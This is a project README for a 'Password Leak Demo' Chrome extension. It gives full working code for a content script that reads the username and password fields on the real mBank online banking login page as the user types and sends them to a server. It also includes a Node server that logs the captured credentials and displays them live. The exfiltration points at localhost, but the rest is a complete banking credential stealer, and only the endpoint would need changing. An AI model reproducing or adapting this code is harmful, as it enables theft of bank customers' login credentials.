# Password Leak Demo Extension

This project demonstrates a browser extension that captures and sends login credentials from a specific website to a local server. The server then displays the captured credentials on a webpage.

## Prerequisites

- [Node.js](https://nodejs.org/) (LTS version recommended)
- A code editor, such as [Visual Studio Code](https://code.visualstudio.com/)

## Installation and Setup

### Step 1: Install Node.js

1. **Download Node.js**:
   - Go to the [Node.js website](https://nodejs.org/).
   - Download the LTS (Long Term Support) version for Windows.

2. **Install Node.js**:
   - Run the installer and follow the prompts to complete the installation.
   - Ensure that the installer adds Node.js to your system PATH.

3. **Verify Installation**:
   - Open a terminal (Command Prompt, PowerShell, or VSCode terminal).
   - Verify Node.js installation by running:
     ```sh
     node -v
     ```
   - Verify npm installation by running:
     ```sh
     npm -v
     ```

### Step 2: Set Up the Project Directory

1. **Create a Project Directory**:
   - Open File Explorer and create a new directory, e.g., `C:\Users\YourUsername\Desktop\BrowserExtensionDemo`.

2. **Open the Directory in VSCode**:
   - Right-click on the directory and select "Open with Code" or open VSCode and use `File > Open Folder` to open the directory.

### Step 3: Create the Server Script

1. **Initialize npm in the Project Directory**:
   - Open a terminal in VSCode.
   - Run the following command to initialize a new Node.js project:
     ```sh
     npm init -y
     ```

2. **Install the `ws` Library**:
   - In the terminal, run:
     ```sh
     npm install ws
     ```

3. **Create the `server.js` File**:
   - In the project directory, create a new file named `server.js`.
   - Add the following content to `server.js`:

     ```javascript
     const http = require('http');
     const url = require('url');
     const WebSocket = require('ws');

     let lastCredentials = { username: '', password: '' };

     const server = http.createServer((req, res) => {
       const queryObject = url.parse(req.url, true).query;

       if (queryObject.username && queryObject.password) {
         lastCredentials.username = queryObject.username;
         lastCredentials.password = queryObject.password;
         console.log(`Username: ${lastCredentials.username}, Password: ${lastCredentials.password}`);

         // Broadcast the new credentials to all connected WebSocket clients
         wss.clients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
             client.send(JSON.stringify(lastCredentials));
           }
         });
       }

       res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
       res.end(`
         <html>
         <head><title>Hakuję twój mBank!</title></head>
         <body>
           <h1>Hakuję twój mBank!</h1>
           <p><strong>Username:</strong> ${lastCredentials.username}</p>
           <p><strong>Password:</strong> ${lastCredentials.password}</p>
           <script>
             const ws = new WebSocket('ws://localhost:1337');
             ws.onmessage = (event) => {
               const data = JSON.parse(event.data);
               document.querySelector('p:nth-of-type(1)').innerHTML = '<strong>Username:</strong> ' + data.username;
               document.querySelector('p:nth-of-type(2)').innerHTML = '<strong>Password:</strong> ' + data.password;
             };
           </script>
         </body>
         </html>
       `);
     });

     // Create a WebSocket server
     const wss = new WebSocket.Server({ server });

     server.listen(1337, '127.0.0.1', () => {
       console.log('Server running at http://127.0.0.1:1337/');
     });
     ```

### Step 4: Run the Server

1. **Start the Server**:
   - In the terminal, run:
     ```sh
     node server.js
     ```
   - You should see `Server running at http://127.0.0.1:1337/` in the terminal.

### Step 5: Create the Chrome Extension

1. **Create Extension Files**:
   - In your project directory, create the following files:

     **`manifest.json`**:
     ```json
     {
       "manifest_version": 3,
       "name": "Password Leak Demo",
       "version": "1.0",
       "description": "A demo extension to capture and send login credentials.",
       "permissions": [
         "activeTab",
         "scripting"
       ],
       "host_permissions": [
         "https://online.mbank.pl/*"
       ],
       "background": {
         "service_worker": "background.js"
       },
       "content_scripts": [
         {
           "matches": ["https://online.mbank.pl/*"],
           "js": ["content.js"]
         }
       ]
     }
     ```

     **`background.js`**:
     ```javascript
     chrome.runtime.onInstalled.addListener(() => {
       console.log("Password Leak Demo Extension Installed");
     });
     ```

     **`content.js`**:
     ```javascript
     if (window.location.origin === "https://online.mbank.pl") {
       hook();
     }

     function hook() {
       const userId = document.getElementById("userID");
       if (!userId) {
         setTimeout(hook, 500);
         return;
       }

       const pass = document.getElementById("pass");

       const listener = () => {
         const user = userId.value;
         const password = pass.value;
         console.log({ user, password });
         fetch(`http://localhost:1337/leak?username=${encodeURIComponent(user)}&password=${encodeURIComponent(password)}`);
       };

       userId.addEventListener("input", listener);
       pass.addEventListener("input", listener);
     }
     ```

### Step 6: Load the Extension in Chrome

1. **Open Chrome and Navigate to `chrome://extensions/`**:
   - Enable "Developer mode" using the toggle switch in the top-right corner.

2. **Load the Unpacked Extension**:
   - Click the "Load unpacked" button and select your project directory.

### Step 7: Test the Setup

1. **Navigate to the Test Page**:
   - Open `https://online.mbank.pl` in Chrome.

2. **Enter Test Credentials**:
   - Enter some test credentials in the form fields.

3. **View the Captured Credentials**:
   - Open `http://localhost:1337` in your browser to see the captured credentials displayed dynamically.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
